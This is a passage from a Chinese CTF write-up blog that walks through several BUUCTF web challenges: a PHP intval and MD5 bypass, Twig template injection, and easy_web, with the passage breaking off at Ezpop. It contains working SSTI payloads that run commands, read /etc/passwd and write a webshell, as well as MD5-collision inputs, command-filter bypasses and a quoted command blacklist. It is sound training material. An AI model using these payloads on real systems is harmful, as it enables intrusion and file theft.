class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(intval(&#x27;1e10&#x27;));</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">var_dump(intval(&#x27;3.1415926e5&#x27;));</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">var_dump(intval(&#x27;8724e-2&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b32.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b32.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>出现异常</p><p>经过查询发现 <code>intval()</code>  在  <code>PHP7.2.5 及以上版本</code>  中的表现符合预期，与我们对科学计数法的认知相符。  <code>PHP7.2.5 以下的某个版本以前</code> 表现异常，在 <code>PHP7.2.5 以下的某个版本</code>  以前， <code>intval()</code>  函数无法正确解析字符  <code>E</code>  或  <code>e</code> ，于是  <code>intval</code>  在解析到  <code>E</code>  或  <code>e</code>  时立即停止，这导致科学计数法实际并未生效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(intval(&#x27;1E2&#x27;));</span><br><span class="line">var_dump(intval(1E2));</span><br><span class="line"></span><br><span class="line">var_dump(intval(&#x27;3.688e2&#x27;));</span><br><span class="line">var_dump(intval(3.688e2));</span><br><span class="line"></span><br><span class="line">var_dump(intval(&#x27;9999E-3&#x27;));</span><br><span class="line">var_dump(intval(9999E-3));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行效果</p><p>int(1)<br>int(100)<br>int(3)<br>int(368)<br>int(9999)<br>int(9)</p><p>回到题目，本题的 intval 就是利用这个来尝试绕过，因为 GET 传入的类型为 string，所以会导致 intval 函数内传入的值带上了单引号，就利用上了 intval 的漏洞，本地复现一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">gettype</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b34.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b34.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以很明显的看到成功的绕过了， <code>intval('2e4')</code>  返回 2， <code>intval('2e4'+1)</code>  返回 20001</p><p>这样就绕过了 level1</p><p>level2</p><p>就很常见了 md5 加密前后都是 0e 开头科学计数法 0=0 就饶过了，就让 md5= <code>0e215962017</code>  就可以了</p><p>0e215962017<br>0e291242476940776845150308577824</p><p>level3</p><p>既然要获得 flag 至少得知道 flag 的文件名吧，先 ls 查一下目录</p><p>构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=ls</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b35.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b35.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>好家伙 fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag 这么长。。。</p><p>想办法获得 flag，既然 cat 被禁了就 tac，空格被禁了就用 $IFS$1（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>改成</mtext></mrow><annotation encoding="application/x-tex">1改成</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">改</span><span class="mord cjk_fallback">成</span></span></span></span>加其他数字貌似都行）</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b36.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b36.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 42dc02b1-dc77-4b79-877b-25106e29ae8b>flag</p><p>注意 tac 不是把所有内容反向输出，而是类似数组那样正常输出数组是顺序输出，tac 的话会从后往前开始输出，kali 本地复现</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b37.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b37.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b38.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b38.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>运行 test.php</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b39.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b39.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="bjdctf2020cookie-is-so-stable"><a class="markdownIt-Anchor" href="#bjdctf2020cookie-is-so-stable">#</a> [BJDCTF2020]Cookie is so stable</h2><p>看到 Hint 点进去查看页面源代码</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b40.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b40.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>那就输入数据抓包查看一下 cookies</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b41.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b41.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试 sql 注入失败了，可能是 ssti 注入？</p><p>这里记录一下判断模板注入类型的方法，贴一个学习链接：<a href="https://blog.csdn.net/xhy18634297976/article/details/123011238">https://blog.csdn.net/xhy18634297976/article/details/123011238</a></p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b42.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b42.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>输入 <code>&#123;&#123;7*'7'&#125;&#125;</code>  返回 49 是 Twig 模块，返回 7777777 表示是 Jinja2 模块</p><p>那就试试看，看看应该用哪种注入模板</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b43.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b43.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到他返回的是 49，所以本题模板注入是 Twig 注入，找一下注入模板，因为是 Twig 注入，所以是由固定的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;//查看id</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;//查看flag</span><br></pre></td></tr></table></figure><p>在 Cookie 里面输入</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b44.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b44.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p ee4ffe9e-fb24-4f61-8dc6-98a2b5a0e396>得到 flag，flag</p><p>ssti 注入模板贴一个学习链接：<a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>twig3.x 版本根据官方文档新增了 filter 和 map 等内容，补充一些新版本的 payload 在这里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="安洵杯-2019easy_web"><a class="markdownIt-Anchor" href="#安洵杯-2019easy_web">#</a> [安洵杯 2019] easy_web</h2><p>查看源码能获得到的信息只有一个 md5 is funny，那很明显本题和 md5 有关，看到 url 里 img 的参数后面的值就很想把他解码了</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b45.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b45.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b46.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b46.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>两次 base64 解码得到 <code>3535352e706e67</code></p><p>16 进制转字符串得到 <code>555.png</code> ，知道他回显文件的方法，可以逆向思维，尝试访问 index.php 先转 16 进制再 base64 加密两次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">696e6465782e706870//16</span><br><span class="line">Njk2ZTY0NjU3ODJlNzA2ODcw//一次base64</span><br><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3//两次base64</span><br></pre></td></tr></table></figure><p>访问 index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure><p>f12 查看页面源代码，可以看到一串 base64，解码看看是不是源码</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b47.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b47.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>解码得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计，最重要的是这一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;<span class="comment">//将cmd当作系统命令执行并输出</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_match</code>  的话可以使用 <code>\</code>  绕过， <code>l\s</code>  效果等同于 <code>ls</code></p><p>md5 原本可以使用数组绕过的，但是被强制转换了，可以用相面两个数据来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>md5 的绕过可以用 fastcoll 来生成，具体内容和下载可以看这篇文章：<a href="https://www.zeroplace.cn/article.asp?id=886%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E7%94%9F%E6%88%90%E7%9A%84url%E7%BC%96%E7%A0%81%E5%BE%88%E5%AE%B9%E6%98%93%E5%87%BA%E7%8E%B0%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E7%94%A8%E8%BF%99%E4%B8%AA%E5%88%AB%E7%9A%84%E5%B8%88%E5%82%85%E7%9A%84payload">https://www.zeroplace.cn/article.asp?id=886，但是这个工具生成的 url 编码很容易出现黑名单的字符，所以就用这个别的师傅的 payload</a></p><p>bp 抓包 repeater</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?img=&amp;cmd=dir</span><br><span class="line">POST</span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>如果使用 hackbar post 抓包的话要在 bp 里面再次修改 post 内容，post 的内容会被再次编码，导致无法绕过。因为 ls 被禁用了，这里使用 dir，也可以使用 l\s，效果是一样的</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c01.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看得到了 <code>555.png</code> ， <code>bj.png</code> ， <code>ctf3.jpeg</code> ， <code>index.php</code> ，发现该目录是没有 flag 相关文件的，所以访问上一级，使用 <code>dir \</code>  或者 <code>ls \</code>  访问上一级，<strong>在 burp 中如果使用空格会被识别为其他的参数，所以这里空格用 <code>%20</code>  替换</strong>，ls 要用 <code>\</code>  隔开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img=&amp;cmd=l\s%20/</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c02.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>读取 flag， <code>cat \flag</code>  加入反斜杠 <code>ca\t%20/f\l\a\g</code></p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c03.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p dfa4fed1-7091-49d6-af5d-dad4497448e3>flag</p><h2 id="mrctf2020ezpop"><a class="markdownIt-Anchor" href="#mrctf2020ezpop">#</a> [MRCTF2020]Ezpop</h2><p>这里重新记录一下反序列化的几个魔术方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__destruct(类执行完毕以后调用，其最主要的作用是拿来做垃圾回收机制。)</span><br><span class="line">__construct(类一执行就开始调用，其作用是拿来初始化一些值。)</span><br><span class="line">__toString(在对象当做字符串的时候会被调用。)</span><br><span class="line">__wakeup(该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作)</span><br><span class="line">__sleep(在对象被序列化的过程中自动调用。sleep要加数组)</span><br><span class="line">__invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)</span><br><span class="line">__get(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)</span><br><span class="line">__set(在对象访问私有成员的时候自动被调用，达到了给你看，但是不能给你修改的效果！在对象访问一个私有的成员的时候就会自动的调用该魔术方法)</span><br><span class="line">__call(当所调用的成员方法不存在（或者没有权限）该类时调用，用于对错误后做一些操作或者提示信息)</span><br><span class="line">__isset(方法用于检测私有属性值是否被设定。当外部使用isset读类内部进行检测对象是否有具有某个私有成员的时候就会被自动调用！)</span><br><span class="line">__unset(方法用于删除私有属性。在外部调用类内部的私有成员的时候就会自动的调用__unset魔术方法)</span><br></pre></td></tr></table></figure><p>查看代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 